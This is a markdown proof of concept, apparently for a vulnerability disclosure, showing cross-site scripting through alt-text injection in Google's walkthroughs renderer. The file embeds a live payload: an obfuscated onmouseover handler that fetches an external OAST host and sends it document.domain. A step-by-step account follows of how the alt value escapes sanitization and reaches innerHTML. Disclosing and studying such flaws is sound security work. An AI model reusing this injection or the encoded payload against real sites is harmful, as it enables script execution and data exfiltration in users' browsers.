# PoC: XSS via Zba() Alt Text Injection in walkthroughs.googleusercontent.com

## Summary

This tutorial demonstrates a secondary injection vulnerability (on top of the regex bypass) in
`walkthroughs.googleusercontent.com`. The `Zba()` function post-sanitization creates
`<walkthrough-watcher-block>` custom elements using **unsanitized alt text** from markdown images.
Single quotes in the alt text break the single-quoted attribute context, injecting arbitrary
HTML event handlers.

## XSS Payload (hover over the image below)

If this works, the OAST server at `lqfnwjrw69pcnp2s5x0gags36ucl0do2.oastify.com` will receive
a GET request to `/xss?d=walkthroughs.googleusercontent.com`.

![test' onmouseover='fetch(String.fromCharCode(104,116,116,112,115,58,47,47,108,113,102,110,119,106,114,119,54,57,112,99,110,112,50,115,53,120,48,103,97,103,115,51,54,117,99,108,48,100,111,50,46,111,97,115,116,105,102,121,46,99,111,109,47,120,115,115,63,100,61)+document.domain)' z='](https://lqfnwjrw69pcnp2s5x0gags36ucl0do2.oastify.com/img-probe "t")

*Move your mouse over the broken image icon above.*

## Technical Explanation

The markdown image `![ALT](URL "TITLE")` is processed as follows:

1. Markdown parser creates `<img src="URL" alt="ALT" title="TITLE">`
2. Alt text is rendered with text-context encoding (`wH(text, false)`) — **single quotes are NOT encoded**
3. Google HTML sanitizer (`u7.prototype.gf`) runs, preserves `alt` via allowlist (entry `* ALT`)
4. `XMLSerializer.serializeToString()` serializes the sanitized DOM — **single quotes NOT encoded in double-quoted attributes**
5. `Zba(sanitizedImg, originalUrl)` extracts alt with `/alt="(.*?)"/` — captures the full alt value including injected single-quote content
6. Creates: `<walkthrough-watcher-block image-url='URL' title='TITLE' alt='test' onmouseover='fetch(...)' z=''>`
7. Inserted via **direct `element.innerHTML`** (not Angular DomSanitizer) in `C7.prototype.yb()` → `wh(element, html)`

The single quote in the alt text breaks out of `alt='...'` and injects `onmouseover` as a native browser event handler on the custom element.

<walkthrough-conclusion-trophy></walkthrough-conclusion-trophy>
